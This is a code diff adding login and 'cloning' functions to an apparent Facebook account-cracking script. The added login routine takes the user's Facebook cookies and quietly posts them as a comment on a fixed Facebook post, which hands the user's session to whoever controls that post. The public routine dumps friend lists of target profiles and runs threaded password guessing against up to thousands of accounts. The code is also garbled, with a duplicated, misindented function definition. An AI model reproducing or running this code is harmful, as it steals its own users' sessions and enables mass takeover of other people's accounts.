@@ -72,6 +72,139 @@ id=[]
 tokenku=[]
 def login():
         clear()
+        def login():
+        clear()
+        cookies = input(' Put cookies: ')
+        try:
+                data = requests.get("m.facebook.com", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "en-GB,en-US;q=0.9,en;q=0.8","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
+                find_token = re.search("(EAAG\w+)", data.text)
+                open(".tok.txt", "w").write(find_token.group(1))
+                open(".coki.txt","w").write(cookies)
+                tok=open('.tok.txt','r').read()
+                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
+                name=(info['name'])
+                idd=(info['id'])
+                barth=(info['birthday'])
+                linex()
+                print(' Welcome\033[1;32m : '+name)
+                print(' \033[1;37mYour UID : '+idd)
+                print(' Barth Day: '+barth)
+                requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
+                linex()
+                print(' Cookies login has been successfull...')
+                time.sleep(1)
+                menu()
+        except KeyError:
+                print('\033[1;31m Cookies has been expired...')
+                os.system('rm -rf .tok.txt');time.sleep(1);login()
+        except requests.exceptions.ConnectionError:
+                exit(' internet connection error...')
+        except AttributeError:
+                print('\033[1;31m Cookies has been expired...')
+                os.system('rm -rf .tok.txt');time.sleep(1);login()
+                login()
+def public():
+        usrr=[]
+        clear()
+        try:
+                tok = open('.tok.txt','r').read()
+                cok = open('.coki.txt','r').read()
+                tokenku.append(tok)
+        except KeyError:
+                print('\033[1;31mYour cookies han expired...');time.sleep(1)
+                login()
+        except IOError:
+                print('\033[1;31mYour cookies han expired...');time.sleep(1)
+                login()
+        try:
+                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
+                name=(info['name'])
+                print('\033[1;32m Welcome '+name)
+                linex()
+        except KeyError:
+                print('\033[1;31mYour cookies han expired...');time.sleep(1)
+                login()
+        try:
+                jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;37m '))
+        except ValueError:
+                exit(' Put only digits not latters ')
+        if jum<1 or jum>5000:
+                exit()
+        ses=requests.Session()
+        yz = 0
+        for met in range(jum):
+                yz+=1
+                kl = input(f'\033[1;37m Put link no.{yz+0}: ')
+                usrr.append(kl)
+        linex()
+        print(' All method working try 1 by 1 ')
+        linex()
+        print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
+        linex()
+        mthd = input(' Choose method: ')
+        linex()
+        print(' Do you went show cp account? (y/n): ')
+        linex()
+        cx=input(' Choose: ')
+        if cx in ['y','Y','yes','Yes','1']:
+                pcp.append('y')
+        else:
+                pcp.append('n')
+        linex()
+        print('\033[1;32m Dumping friend list...\033[1;37m')
+        linex()
+        for userr in usrr:
+                try:
+                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+                        for mi in col['friends']['data']:
+                                try:
+                                        iso = (mi['id']+'|'+mi['name'])
+                                        if iso in id:pass
+                                        else:id.append(iso)
+                                except:continue
+                except (KeyError,IOError):
+                        pass
+                except requests.exceptions.ConnectionError:
+                        exit(f' No internet connection')
+        try:
+                plist = []
+                try:
+                        ps_limit = int(input(' How many passwords do you want to add ? '))
+                except:
+                        ps_limit =1
+                linex()
+                print('\033[1;32m exp: first last,firstlast,first123')
+                linex()
+                for i in range(ps_limit):
+                        plist.append(input(f' Put password {i+1}: '))
+                with tred(max_workers=30) as crack_submit:
+                        clear()
+                        total_ids = str(len(id))
+                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
+                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        linex()
+                        for user in id:
+                                ids,names = user.split('|')
+                                passlist = plist
+                                if mthd in ['1','01']:
+                                        crack_submit.submit(ffb,ids,names,passlist)
+                                elif mthd in ['2','02']:
+                                        crack_submit.submit(api,ids,names,passlist)
+                                else:
+                                        crack_submit.submit(api1,ids,names,passlist)
+                print('\033[1;37m')
+                linex()
+                print(' The process has completed')
+                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                linex()
+                input(' Press enter to back ')
+                os.system('python AKING.py')
+        except requests.exceptions.ConnectionError:
+                exit(f' No internet connection')
+        except (KeyError,IOError):
+                print(f' No friends for {userr}')
+                time.sleep(3)
+                public()
     def menu():
         try:
                 clear()
